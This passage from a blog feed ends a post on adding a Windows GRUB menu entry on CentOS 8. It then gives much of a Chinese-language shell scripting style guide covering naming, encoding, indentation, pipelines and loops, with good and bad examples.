style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> vi  /etc/grub.d/40_custom</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置示例如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> #!/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> exec tail -n +3 $0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> # This file provides an easy way to add custom menu entries.  Simply type the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> # menu entries you want to add after this comment.  Be careful not to change</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> # the 'exec tail' line above.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> menuentry "Windows" {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         set root=(hd0,1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         chainloader +1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>保存并执行以下命令使自定义配置生效：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grub2-mkconfig --output=/boot/grub2/grub.cfg</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>OVER.</p>]]></content>
        <category label="os" term="os"/>
        <category label="centos" term="centos"/>
        <category label="grub" term="grub"/>
        <category label="centos8" term="centos8"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[shell style guide]]></title>
        <id>/2020/01/03/shell-standards</id>
        <link href="https://itxx00.github.io/notes/blog/2020/01/03/shell-standards"/>
        <updated>2020-01-03T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>这里是一句长长的引言</p></blockquote><ul><li>Shell 编码规范
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前言">前言<a class="hash-link" href="#前言" title="标题的直接链接">​</a></h2><p>与其它的编程规范一样，这里所讨论的不仅仅是编码格式美不美观的问题， 同时也讨论一些约定及编码标准。这份文档主要侧重于我们所普遍遵循的规则， 对于那些不是明确强制要求的，我们尽量避免提供意见。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="为什么要有编码规范">为什么要有编码规范<a class="hash-link" href="#为什么要有编码规范" title="标题的直接链接">​</a></h3><p>编码规范对于程序员而言尤为重要，有以下几个原因：</p><ul><li>一个软件的生命周期中，80%的花费在于维护</li><li>几乎没有任何一个软件，在其整个生命周期中，均由最初的开发人员来维护</li><li>编码规范可以改善软件的可读性，可以让程序员尽快而彻底地理解新的代码</li><li>如果你将源码作为产品发布，就需要确任它是否被很好的打包并且清晰无误，一如你已构建的其它任何产品</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="编码规范原则">编码规范原则<a class="hash-link" href="#编码规范原则" title="标题的直接链接">​</a></h3><p>本文档中的准则致力于最大限度达到以下原则：</p><ul><li>正确性</li><li>可读性</li><li>可维护性</li><li>可调试性</li><li>一致性</li><li>美观</li></ul><p>尽管本文档涵盖了许多基础知识，但应注意的是，没有编码规范可以为我们回答所有问题，开发人员始终需要再编写完代码后，对上述原则做出正确的判断。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="代码规范等级定义">代码规范等级定义<a class="hash-link" href="#代码规范等级定义" title="标题的直接链接">​</a></h3><ul><li><strong>可选（Optional）</strong>：用户可参考，自行决定是否采用；</li><li><strong>推荐（Preferable）</strong>：用户理应采用，但如有特殊情况，可以不采用；</li><li><strong>必须（Mandatory）</strong>：用户必须采用（除非是少数非常特殊的情况，才能不采用）；</li></ul><p><strong>注：</strong> 未明确指明的则默认为 <strong>必须（Mandatory）</strong></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="本文档参考">本文档参考<a class="hash-link" href="#本文档参考" title="标题的直接链接">​</a></h3><p>主要参考如下文档:</p><ul><li><a href="https://google.github.io/styleguide/shell.xml" target="_blank" rel="noopener noreferrer" title="Google Shell Style Guide">Google Shell Style Guide</a></li><li><a href="https://wiki.bash-hackers.org/scripting/style" target="_blank" rel="noopener noreferrer" title="Scripting with style">Bash Hackers Wiki</a></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="源文件">源文件<a class="hash-link" href="#源文件" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="基础">基础<a class="hash-link" href="#基础" title="标题的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="使用场景">使用场景<a class="hash-link" href="#使用场景" title="标题的直接链接">​</a></h4><p>仅建议Shell用作相对简单的实用工具或者包装脚本。因此单个shell脚本内容不宜太过复杂。</p><p>在选择何时使用shell脚本时时应遵循以下原则：</p><ul><li>如主要用于调用其他工具且需处理的数据量较少，则shell是一个选择</li><li>如对性能十分敏感，则更推荐选择其他语言，而非shell</li><li>如需处理相对复杂的数据结构，则更推荐选择其他语言，而非shell</li><li>如脚本内容逐渐增长且有可能出现继续增长的趋势，请尽早使用其他语言重写</li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="文件名">文件名<a class="hash-link" href="#文件名" title="标题的直接链接">​</a></h4><p>可执行文件不建议有扩展名，库文件必须使用 <strong>.sh</strong> 作为扩展名，且应是不可执行的。</p><p>执行一个程序时，无需知道其编写语言，且shell脚本并不要求具有扩展名，所以更倾向可执行文件没有扩展名。</p><p>而库文件知道其编写语言十分重要，使用 <strong>.sh</strong> 作为特定语言后缀的扩展名，可以和其他语言编写的库文件加以区分。</p><p>文件名要求全部小写, 可以包含下划线 <code>_</code> 或连字符 <code>-</code>, 建议可执行文件使用连字符，库文件使用下划线。</p><p>正例:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">my-useful-bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my_useful_libraries.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">myusefullibraries.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">My_Useful_Bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">myUsefulLibraries.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="文件编码">文件编码<a class="hash-link" href="#文件编码" title="标题的直接链接">​</a></h4><p>源文件编码格式为<strong>UTF-8</strong>。
避免不同操作系统对文件换行处理的方式不同，一律使用<code>LF</code>。</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="单行长度">单行长度<a class="hash-link" href="#单行长度" title="标题的直接链接">​</a></h4><p>每行最多不超过120个字符。每行代码最大长度限制的根本原因是过长的行会导致阅读障碍，使得缩进失效。</p><p>除了以下两种情况例外：</p><ul><li>导入模块语句</li><li>注释中包含的URL</li></ul><p>如出现长度必须超过120个字符的字符串，应尽量使用here document或者嵌入的换行符等合适的方法使其变短。</p><p>示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># DO use 'here document's</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat &lt;&lt;END;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I am an exceptionally long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">string.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">END</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Embedded newlines are ok too</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">long_string="I am an exceptionally</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  long string."</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="空白字符">空白字符<a class="hash-link" href="#空白字符" title="标题的直接链接">​</a></h4><p>除了在行结束使用换行符，空格是源文件中唯一允许出现的空白字符。</p><ul><li>字符串中的非空格空白字符，使用转义字符</li><li>不允许行前使用tab缩进，如果使用tab缩进，必须设置1个tab为4个空格</li><li>不应在行尾出现没有意义的空白字符</li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="垃圾清理--推荐--">垃圾清理<sup>  <em>推荐</em>  </sup><a class="hash-link" href="#垃圾清理--推荐--" title="标题的直接链接">​</a></h4><p>对从来没有用到的或者被注释的方法、变量等要坚决从代码中清理出去，避免过多垃圾造成干扰。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="结构">结构<a class="hash-link" href="#结构" title="标题的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="使用bash">使用bash<a class="hash-link" href="#使用bash" title="标题的直接链接">​</a></h4><p>Bash 是唯一被允许使用的可执行脚本shell。</p><p>可执行文件必须以 <code>#!/bin/bash</code> 开始。请使用 <code>set</code> 来设置shell的选项，使得用 <code>bash &lt;script_name&gt;</code> 调用你的脚本时不会破坏其功能。</p><p>限制所有的可执行shell脚本为bash使得我们安装在所有计算机中的shell语言保持一致性。
正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set -e</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/sh -e</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="许可证或版权信息--推荐--">许可证或版权信息<sup>  <em>推荐</em>  </sup><a class="hash-link" href="#许可证或版权信息--推荐--" title="标题的直接链接">​</a></h4><p>许可证与版权信息需放在源文件的起始位置。例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Licensed under the BSD 3-Clause License (the "License"); you may not use this file except</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># in compliance with the License. You may obtain a copy of the License at</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># https://opensource.org/licenses/BSD-3-Clause</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Unless required by applicable law or agreed to in writing, software distributed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># CONDITIONS OF ANY KIND, either express or implied. See the License for the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># specific language governing permissions and limitations under the License.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="缩进">缩进<a class="hash-link" href="#缩进" title="标题的直接链接">​</a></h4><h5 class="anchor anchorWithStickyNavbar_LWe7" id="块缩进">块缩进<a class="hash-link" href="#块缩进" title="标题的直接链接">​</a></h5><p>每当开始一个新的块，缩进增加4个空格（不能使用\t字符来缩进）。当块结束时，缩进返回先前的缩进级别。缩进级别适用于代码和注释。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">main() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # 缩进4个空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    say="hello"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    flag=0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if [[ $flag = 0 ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # 缩进4个空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        echo "$say"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_LWe7" id="管道">管道<a class="hash-link" href="#管道" title="标题的直接链接">​</a></h5><p>如果一行容不下整个管道操作，那么请将整个管道操作分割成每行一个管段。</p><p>如果一行容得下整个管道操作，那么请将整个管道操作写在同一行，管道左右应有空格。</p><p>否则，应该将整个管道操作分割成每行一段，管道操作的下一部分应该将管道符放在新行并且缩进4个空格。这适用于管道符 <code>|</code> 以及逻辑运算 <code>||</code> 和 <code>&amp;&amp;</code> 。
正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 单行管道连接，管道左右空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">command1 | command2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 长命令管道换行连接，管道放置于下一个命令开头，缩进4个空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">command1 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    | command2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    | command3 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    | command4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 管道左右无空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">command1|command2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 换行连接管道放置于行末</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">command1 | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    command2 | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    command3 | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    command4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_LWe7" id="循环">循环<a class="hash-link" href="#循环" title="标题的直接链接">​</a></h5><p>请将 <code>; do</code> , <code>; then</code> 和 <code>while</code> , <code>for</code> , <code>if</code> 放在同一行。</p><p>shell中的循环略有不同，但是我们遵循跟声明函数时的大括号相同的原则。即：
<code>; do</code> , <code>; then</code> 应该和 while/for/if 放在同一行。
else 应该单独一行。
结束语句应该单独一行且跟开始语句缩进对齐。</p><p>正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">for dir in ${dirs_to_cleanup}; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if [[ -d "${dir}/${BACKUP_SID}" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        log_date "Cleaning up old files in ${dir}/${BACKUP_SID}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        rm "${dir}/${BACKUP_SID}/"*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if [[ "$?" -ne 0 ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            error_message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mkdir -p "${dir}/${BACKUP_SID}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if [[ "$?" -ne 0 ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            error_message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">function getBatchName()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    batch_name="batch"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if [[ "$input5"x == *$batch_name* ]]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        batch_name=$input5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    else if [[ "$input6"x == *$batch_name* ]]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        batch_name=$input6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    else if [[ "$input7"x == *$batch_name* ]]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        batch_name=$input7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_LWe7" id="case语句">case语句<a class="hash-link" href="#case语句" title="标题的直接链接">​</a></h5><p>通过4个空格缩进可选项。
可选项中的多个命令应该被拆分成多行，模式表达式、操作和结束符 <code>;;</code> 在不同的行。
匹配表达式比 case 和 esac 缩进一级。多行操作要再缩进一级。
模式表达式前面不应该出现左括号。避免使用 <code>;&amp;</code> 和 <code>;;&amp;</code> 符号。
